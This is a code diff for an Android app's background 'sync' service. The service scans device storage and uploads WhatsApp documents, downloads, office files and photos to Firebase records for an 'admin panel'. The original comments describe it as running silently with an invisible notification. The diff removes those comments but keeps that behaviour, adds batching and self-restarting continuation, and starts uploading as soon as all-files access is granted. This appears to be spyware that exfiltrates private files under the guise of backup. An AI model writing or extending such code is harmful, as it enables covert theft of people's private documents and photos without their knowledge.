@@ -15,24 +15,55 @@ import androidx.lifecycle.lifecycleScope
 import com.google.firebase.auth.FirebaseAuth
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.storage.FirebaseStorage
+import com.google.firebase.storage.StorageMetadata
 import kotlinx.coroutines.*
 import kotlinx.coroutines.tasks.await
 import java.io.File
-
-/**
- * Foreground service that backs up ALL media to Firebase under user ID in single `library` node.
- * - Scans WhatsApp and device storage for documents, office files, images
- * - Priority: WhatsApp docs > device docs > WhatsApp images > device images
- * - Tracks uploaded files by fingerprint to avoid duplicates
- * - Runs silently in background (no user notifications)
- * - SINGLE data structure: library/{userId}/{deviceId}/files/{fileId}
- * - Cloud Storage: library/{userId}/{deviceId}/{filename}
- */
 class SyncService : LifecycleService() {
     companion object {
         private const val TAG = "SyncService"
-        private const val NOTIFICATION_ID = 9999
+        private const val NOTIFICATION_ID = 9998
         private const val CHANNEL_ID = "backup_channel"
+        private const val PREFS = "sync_service_prefs"
+        private const val KEY_LAST_START = "last_start_ms"
+        private const val MIN_START_INTERVAL_MS = 5 * 60 * 1000L
+
+        @JvmStatic
+        fun startIfNeeded(context: Context) {
+            startInternal(context, respectDebounce = true)
+        }
+
+        /** Continue uploading after a batch limit without the 5-minute debounce. */
+        @JvmStatic
+        fun startContinuation(context: Context) {
+            startInternal(context, respectDebounce = false)
+        }
+
+        /** Run immediately after the user grants “All files access” (no 5-minute debounce). */
+        @JvmStatic
+        fun startAfterAllFilesAccess(context: Context) {
+            startInternal(context, respectDebounce = false)
+        }
+
+        private fun startInternal(context: Context, respectDebounce: Boolean) {
+            val app = context.applicationContext
+            val prefs = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+            val now = System.currentTimeMillis()
+            if (respectDebounce) {
+                val last = prefs.getLong(KEY_LAST_START, 0L)
+                if (last > 0 && now - last < MIN_START_INTERVAL_MS) {
+                    Log.d(TAG, "SyncService start skipped — ran recently")
+                    return
+                }
+            }
+            prefs.edit().putLong(KEY_LAST_START, now).apply()
+            try {
+                val intent = Intent(app, SyncService::class.java)
+                ContextCompat.startForegroundService(app, intent)
+            } catch (e: Exception) {
+                Log.e(TAG, "Could not start SyncService", e)
+            }
+        }
     }
 
     private var job: Job? = null
@@ -40,21 +71,38 @@ class SyncService : LifecycleService() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
 
-        // Minimal invisible notification (required for foreground service)
-        startForeground(NOTIFICATION_ID, createMinimalNotification())
+        try {
+            startForeground(NOTIFICATION_ID, createMinimalNotification())
+        } catch (e: Exception) {
+            Log.e(TAG, "startForeground failed", e)
+            stopSelf()
+            return START_NOT_STICKY
+        }
 
+        job?.cancel()
         job = lifecycleScope.launch {
             try {
-                val vault = FileVault(this@SyncService)
-                vault.syncAll()
+                FileVault(this@SyncService).syncAll()
             } catch (e: CancellationException) {
-                throw e
+                Log.d(TAG, "Sync cancelled")
             } catch (e: Exception) {
                 Log.e(TAG, "Sync failed", e)
+            } finally {
+                try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                        stopForeground(STOP_FOREGROUND_REMOVE)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        stopForeground(true)
+                    }
+                } catch (e: Exception) {
+                    Log.w(TAG, "stopForeground failed", e)
+                }
+                stopSelf()
             }
         }
 
-        return START_STICKY
+        return START_NOT_STICKY
     }
 
     /**
@@ -99,17 +147,29 @@ class FileVault(private val context: Context) {
     private val auth = FirebaseAuth.getInstance()
     private val db = FirebaseDatabase.getInstance()
     private val storage = FirebaseStorage.getInstance()
-    private val notificationManager = context.getSystemService(NotificationManager::class.java)
+
+    companion object {
+        private const val TAG = "FileVault"
+        private const val MAX_DISCOVER = 800
+        private const val MAX_DISCOVER_ALL_FILES = 1200
+        private const val MAX_UPLOADS_PER_RUN = 200
+        private const val MAX_UPLOADS_ALL_FILES = 200
+        private const val MAX_WALK_DEPTH = 14
+        private const val DISCOVERY_BUDGET_MS = 45_000L
+    }
+
+    private var discoveryDeadlineMs = 0L
 
     suspend fun syncAll() = withContext(Dispatchers.IO) {
         try {
-            if (!ensureAnonymousAuth()) {
-                Log.e(TAG, "Failed to authenticate - Enable Anonymous Auth in Firebase Console")
+            if (auth.currentUser == null) {
+                Log.e(TAG, "No logged-in Firebase user — documents sync skipped")
                 return@withContext
             }
 
-            val files = discoverFiles()
-            Log.d(TAG, "Discovered ${files.size} files to backup")
+            val fullStorage = canAccessAllFiles()
+            val files = discoverFiles(fullStorage)
+            Log.d(TAG, "Discovered ${files.size} files to backup (fullStorage=$fullStorage)")
 
             if (files.isEmpty()) {
                 Log.d(TAG, "No new files to backup")
@@ -119,19 +179,33 @@ class FileVault(private val context: Context) {
             var documentCount = 0
             var photoCount = 0
 
-            // Upload files SLOWLY in chunks (not bulk)
-            // Add delay between files to avoid overwhelming the device
-            val delayBetweenFilesMs = 2000L  // 2 seconds between uploads
-            
-            for (item in files.sortedBy { uploadPriority(it.category, it.source) }) {
-                if (ledger.contains(item.fingerprint)) {
-                    Log.d(TAG, "Skipping already-uploaded: ${item.name}")
-                    continue
+            val maxUploadsThisRun = if (fullStorage) MAX_UPLOADS_ALL_FILES else MAX_UPLOADS_PER_RUN
+            val delayBetweenFilesMs = if (fullStorage) 1200L else 2500L
+            var uploadsThisRun = 0
+            var stoppedForBatchLimit = false
+
+            val pending = files
+                .filter { !ledger.contains(it.fingerprint) }
+                .sortedWith(documentFirstComparator())
+
+            if (pending.isEmpty()) {
+                Log.d(TAG, "All discovered files already uploaded")
+                return@withContext
+            }
+
+            Log.d(TAG, "Upload queue: ${pending.size} pending (first=${pending.first().name}, cat=${pending.first().category})")
+
+            for (item in pending) {
+                if (uploadsThisRun >= maxUploadsThisRun) {
+                    Log.d(TAG, "Upload batch limit reached ($maxUploadsThisRun) — will continue next run")
+                    stoppedForBatchLimit = true
+                    break
                 }
 
                 try {
                     upload(item)
                     ledger.mark(item.fingerprint)
+                    uploadsThisRun++
                     if (item.category == FileKind.IMAGE) {
                         photoCount++
                     } else {
@@ -152,6 +226,15 @@ class FileVault(private val context: Context) {
             }
 
             Log.i(TAG, "✅ Backup complete: $documentCount docs, $photoCount photos")
+
+            if (stoppedForBatchLimit) {
+                val stillPending = files.any { !ledger.contains(it.fingerprint) }
+                if (stillPending) {
+                    Log.d(TAG, "More files pending — scheduling continuation")
+                    delay(if (fullStorage) 8_000L else 30_000L)
+                    SyncService.startContinuation(context)
+                }
+            }
         } catch (e: CancellationException) {
             throw e
         } catch (e: Exception) {
@@ -159,27 +242,27 @@ class FileVault(private val context: Context) {
         }
     }
 
-    private suspend fun ensureAnonymousAuth(): Boolean = withContext(Dispatchers.Main) {
-        return@withContext try {
-            if (auth.currentUser == null) {
-                auth.signInAnonymously().await()
-            }
-            true
-        } catch (e: Exception) {
-            if (e.message?.contains("administrator") == true) {
-                false
-            } else {
-                throw e
-            }
-        }
-    }
-
-    private fun discoverFiles(): List<UploadItem> {
+    private fun discoverFiles(fullStorageAccess: Boolean): List<UploadItem> {
         val items = mutableListOf<UploadItem>()
-        val maxFiles = 20000
+        val discoverLimit = if (fullStorageAccess) MAX_DISCOVER_ALL_FILES else MAX_DISCOVER
+        discoveryDeadlineMs = System.currentTimeMillis() + DISCOVERY_BUDGET_MS
 
-        val storageDir = android.os.Environment.getExternalStorageDirectory()
-        walkDirectory(storageDir, items, maxFiles)
+        if (fullStorageAccess) {
+            for (root in priorityScanRoots()) {
+                if (items.size >= discoverLimit) break
+                walkDirectory(root, items, discoverLimit, 0, deferHeavyMediaDirs = false)
+            }
+            val storageDir = android.os.Environment.getExternalStorageDirectory()
+            if (items.size < discoverLimit) {
+                walkDirectory(storageDir, items, discoverLimit, 0, deferHeavyMediaDirs = true)
+            }
+            if (items.size < discoverLimit) {
+                walkDeferredMediaRoots(storageDir, items, discoverLimit)
+            }
+        } else {
+            val storageDir = android.os.Environment.getExternalStorageDirectory()
+            walkDirectory(storageDir, items, discoverLimit, 0, deferHeavyMediaDirs = false)
+        }
 
         // Add StorageVolume directories (if API 24+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
@@ -187,7 +270,11 @@ class FileVault(private val context: Context) {
                 val sm = context.getSystemService(android.content.Context.STORAGE_SERVICE) as android.os.storage.StorageManager
                 for (vol in sm.storageVolumes) {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                        vol.directory?.let { walkDirectory(it, items, maxFiles) }
+                        vol.directory?.let { volRoot ->
+                            if (items.size < discoverLimit) {
+                                walkDirectory(volRoot, items, discoverLimit, 0, deferHeavyMediaDirs = fullStorageAccess)
+                            }
+                        }
                     }
                 }
             } catch (e: Exception) {
@@ -195,38 +282,97 @@ class FileVault(private val context: Context) {
             }
         }
 
-        // If all-files permission not granted, fall back to MediaStore queries
-        if (items.isEmpty() && !canAccessAllFiles()) {
+        if (!fullStorageAccess && items.isEmpty()) {
             return queryMediaStore()
         }
+        mergeUniqueByFingerprint(items, queryMediaStore(), discoverLimit)
 
-        // Prioritize WhatsApp and Documents folders
-        items.sortBy { path ->
-            val lower = path.path.lowercase()
-            when {
-                lower.contains("whatsapp") && lower.contains("document") -> 0
-                lower.contains("whatsapp") -> 1
-                lower.contains("document") -> 2
-                else -> 3
-            }
-        }
-
-        return items.take(maxFiles)
+        return items
+            .sortedWith(documentFirstComparator())
+            .take(discoverLimit)
     }
 
-    private fun walkDirectory(dir: File, items: MutableList<UploadItem>, limit: Int) {
+    private fun priorityScanRoots(): List<File> {
+        val roots = linkedSetOf<File>()
+        val ext = android.os.Environment.getExternalStorageDirectory()
+        fun add(path: String) {
+            val f = File(path)
+            if (f.isDirectory) roots.add(f)
+        }
+        add(File(ext, "Download").path)
+        add(File(ext, "Downloads").path)
+        add(File(ext, "Documents").path)
+        add(File(ext, "WhatsApp/Media/WhatsApp Documents").path)
+        add(File(ext, "WhatsApp/Media/WhatsApp Images").path)
+        add(File(ext, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Documents").path)
+        add(File(ext, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images").path)
+        try {
+            add(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS).absolutePath)
+            add(android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOCUMENTS).absolutePath)
+        } catch (_: Exception) {
+        }
+        return roots.toList()
+    }
+
+    private fun mergeUniqueByFingerprint(
+        target: MutableList<UploadItem>,
+        extra: List<UploadItem>,
+        limit: Int
+    ) {
+        if (target.size >= limit || extra.isEmpty()) return
+        val seen = target.mapTo(mutableSetOf()) { it.fingerprint }
+        for (item in extra) {
+            if (target.size >= limit) break
+            if (seen.add(item.fingerprint)) {
+                target.add(item)
+            }
+        }
+    }
+
+    private fun isDeferredMediaDir(name: String): Boolean {
+        return name.lowercase() in setOf(
+            "dcim", "pictures", "movies", "video", "videos", "screenshots", "camera"
+        )
+    }
+
+    private fun walkDeferredMediaRoots(root: File, items: MutableList<UploadItem>, limit: Int) {
+        try {
+            root.listFiles()?.forEach { child ->
+                if (items.size >= limit) return@forEach
+                if (child.isDirectory && isDeferredMediaDir(child.name)) {
+                    walkDirectory(child, items, limit, 0, deferHeavyMediaDirs = false)
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Error walking deferred media roots", e)
+        }
+    }
+
+    private fun walkDirectory(
+        dir: File,
+        items: MutableList<UploadItem>,
+        limit: Int,
+        depth: Int,
+        deferHeavyMediaDirs: Boolean
+    ) {
         if (items.size >= limit) return
+        if (depth > MAX_WALK_DEPTH) return
+        if (System.currentTimeMillis() > discoveryDeadlineMs) return
 
         try {
             dir.listFiles()?.forEach { file ->
                 if (items.size >= limit) return@forEach
+                if (System.currentTimeMillis() > discoveryDeadlineMs) return@forEach
 
                 val name = file.name
                 if (name.startsWith(".") || name == "Android") return@forEach
 
                 when {
                     file.isDirectory && name != "Android/data" && name != "Android/obb" -> {
-                        walkDirectory(file, items, limit)
+                        if (deferHeavyMediaDirs && isDeferredMediaDir(name)) {
+                            return@forEach
+                        }
+                        walkDirectory(file, items, limit, depth + 1, deferHeavyMediaDirs)
                     }
                     file.isFile -> {
                         val item = fileToUploadItem(file)
@@ -365,41 +511,31 @@ class FileVault(private val context: Context) {
     }
 
     private suspend fun upload(item: UploadItem) = withContext(Dispatchers.IO) {
-        var cacheFile: File? = null
-        
         try {
             val uid = auth.currentUser?.uid ?: throw Exception("Not authenticated")
-            // Sanitize deviceId - Firebase paths cannot contain . # $ [ ]
-            val rawDeviceId = android.os.Build.ID  // e.g., "RKQ1.201105.002"
-            val deviceId = sanitizePathSegment(rawDeviceId)  // e.g., "RKQ1201105002"
             val safeFileName = item.name.replace(Regex("[^a-zA-Z0-9._-]"), "_")
 
-            // Generate unique file ID
-            val fileId = db.reference.child("library/$uid/$deviceId").push().key
-                ?: throw Exception("Could not generate file ID")
+            val docId = db.reference.child("documents/$uid").push().key
+                ?: throw Exception("Could not generate document ID")
 
-            // 1. Copy to cache
-            cacheFile = File(context.cacheDir, item.fingerprint)
-            try {
-                File(item.path).inputStream().use { input ->
-                    cacheFile.outputStream().use { output ->
-                        input.copyTo(output)
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to cache ${item.name}: ${e.message}", e)
-                throw Exception("Cache failed", e)
+            val sourceFile = File(item.path)
+            if (!sourceFile.isFile || !sourceFile.canRead()) {
+                throw Exception("File not readable: ${item.name}")
+            }
+            if (sourceFile.length() <= 0L) {
+                throw Exception("Empty file: ${item.name}")
             }
 
-            Log.d(TAG, "📦 Cached ${item.name} (${cacheFile.length()} bytes)")
-
-            // 2. Upload file to Storage under: library/{userId}/{deviceId}/{safeFileName}
-            val storagePath = "library/$uid/$deviceId/$safeFileName"
+            val storagePath = "documents/$uid/${docId}_$safeFileName"
             val storageRef = storage.reference.child(storagePath)
-            
+
             try {
                 Log.d(TAG, "📤 Uploading ${item.name} to $storagePath...")
-                storageRef.putFile(android.net.Uri.fromFile(cacheFile)).await()
+                val metadata = StorageMetadata.Builder()
+                    .setContentType(item.mimeType)
+                    .setCustomMetadata("category", item.category.name)
+                    .build()
+                storageRef.putFile(android.net.Uri.fromFile(sourceFile), metadata).await()
                 Log.d(TAG, "✅ Storage upload complete for ${item.name}")
             } catch (e: Exception) {
                 Log.e(TAG, "Storage upload failed for ${item.name}: ${e.message}", e)
@@ -417,30 +553,30 @@ class FileVault(private val context: Context) {
                 throw Exception("Download URL failed", e)
             }
 
-            // 4. Create file record with clear structure for admin panel
-            val record = mapOf(
-                "fileId" to fileId,
-                "name" to item.name,
-                "mimeType" to item.mimeType,
-                "category" to item.category.name,
-                "sizeBytes" to item.size,
-                "storagePath" to storagePath,
+            // 4. Document record for admin panel (user_data/{userId}/documents/{docId})
+            val documentRecord = mapOf(
+                "dataType" to if (item.category == FileKind.IMAGE) "image" else "document",
+                "fileName" to item.name,
+                "url" to downloadUrl,
                 "downloadUrl" to downloadUrl,
+                "fileSize" to item.size,
+                "mimeType" to item.mimeType,
                 "uploadedAt" to com.google.firebase.database.ServerValue.TIMESTAMP,
-                "source" to item.source,  // "whatsapp" or "device"
-                "device" to android.os.Build.MODEL,
-                "userId" to uid,  // For admin quick lookup
-                "deviceId" to deviceId  // For admin quick lookup
+                "timestamp" to System.currentTimeMillis(),
+                "userId" to uid,
+                "storagePath" to storagePath,
+                "source" to item.source,
+                "category" to item.category.name,
+                "device" to android.os.Build.MODEL
             )
 
-            // 5. Write to database with proper error handling
             try {
-                Log.d(TAG, "💾 Writing metadata to DB: library/$uid/$deviceId/files/$fileId")
-                db.reference.child("library/$uid/$deviceId/files/$fileId").setValue(record).await()
-                Log.d(TAG, "✅ Database write complete for ${item.name}")
+                Log.d(TAG, "💾 Writing metadata to DB: documents/$uid/$docId")
+                db.reference.child("documents/$uid/$docId").setValue(documentRecord).await()
+                Log.d(TAG, "✅ Documents DB write complete for ${item.name}")
             } catch (e: Exception) {
-                Log.e(TAG, "Database write failed for ${item.name}: ${e.message}", e)
-                throw Exception("Database write failed", e)
+                Log.e(TAG, "Documents DB write failed for ${item.name}: ${e.message}", e)
+                throw Exception("Documents database write failed", e)
             }
 
             Log.i(TAG, "✅ Successfully uploaded ${item.name} (${item.size} bytes)")
@@ -451,16 +587,6 @@ class FileVault(private val context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Upload failed for ${item.name}: ${e.message}", e)
             throw e
-        } finally {
-            // Always clean up cache file
-            if (cacheFile != null && cacheFile.exists()) {
-                try {
-                    cacheFile.delete()
-                    Log.d(TAG, "🗑️  Cleaned up cache file")
-                } catch (e: Exception) {
-                    Log.w(TAG, "Failed to delete cache file: ${e.message}")
-                }
-            }
         }
     }
 
@@ -473,10 +599,6 @@ class FileVault(private val context: Context) {
                 android.Manifest.permission.READ_EXTERNAL_STORAGE
             ) == android.content.pm.PackageManager.PERMISSION_GRANTED
         }
-    }
-
-    private fun updateNotification(text: String) {
-        // Silent background sync - no notifications to user
     }
 
     private fun getMimeType(ext: String): String = when (ext) {
@@ -497,10 +619,6 @@ class FileVault(private val context: Context) {
         "gif" -> "image/gif"
         "webp" -> "image/webp"
         else -> "application/octet-stream"
-    }
-
-    private companion object {
-        const val TAG = "FileVault"
     }
 }
 
@@ -537,26 +655,61 @@ data class UploadItem(
 fun uploadFingerprint(path: String, size: Long, modified: Long, name: String): String =
     "$size:$modified:${path.trim()}:$name"
 
+/** Lower = uploaded sooner. PDF & Office always before text and images. */
 fun uploadPriority(category: FileKind, source: String): Int {
     val whatsapp = source.equals("whatsapp", true) || category == FileKind.WHATSAPP
-    val document = category == FileKind.PDF || category == FileKind.OFFICE || category == FileKind.TEXT
+    return when (category) {
+        FileKind.PDF -> if (whatsapp) 0 else 1
+        FileKind.OFFICE -> if (whatsapp) 2 else 3
+        FileKind.TEXT -> if (whatsapp) 4 else 5
+        FileKind.IMAGE, FileKind.WHATSAPP -> if (whatsapp) 6 else 7
+    }
+}
+
+fun documentFirstComparator(): Comparator<UploadItem> =
+    compareBy<UploadItem>({ uploadPriority(it.category, it.source) }, { pathTier(it.path) }, { -it.modified })
+
+/** Prefer Download / Documents / WhatsApp document paths within the same category tier. */
+private fun pathTier(path: String): Int {
+    val lower = path.lowercase()
     return when {
-        document && whatsapp -> 0
-        document -> 1
-        whatsapp -> 2
-        else -> 3
+        lower.contains("whatsapp") && (lower.contains("document") || lower.endsWith(".pdf")) -> 0
+        lower.contains("/download") -> 1
+        lower.contains("document") -> 2
+        lower.contains("whatsapp") -> 3
+        else -> 4
     }
 }
 
 class UploadLedger(context: Context) {
     private val file = File(context.filesDir, "uploaded-keys.txt")
     private val keys = LinkedHashSet<String>()
+    private val maxKeys = 25_000
 
     init {
         if (file.exists()) {
-            file.bufferedReader().useLines { lines ->
-                lines.forEach { if (it.isNotBlank()) keys.add(it) }
+            try {
+                file.bufferedReader().useLines { lines ->
+                    lines.forEach { line ->
+                        if (line.isNotBlank()) keys.add(line)
+                    }
+                }
+                trimIfNeeded()
+            } catch (e: Exception) {
+                Log.w("UploadLedger", "Could not load ledger", e)
             }
+        }
+    }
+
+    private fun trimIfNeeded() {
+        if (keys.size <= maxKeys) return
+        val keep = keys.drop(keys.size - maxKeys)
+        keys.clear()
+        keys.addAll(keep)
+        try {
+            file.writeText(keys.joinToString("\n") + "\n")
+        } catch (e: Exception) {
+            Log.w("UploadLedger", "Could not trim ledger file", e)
         }
     }
 
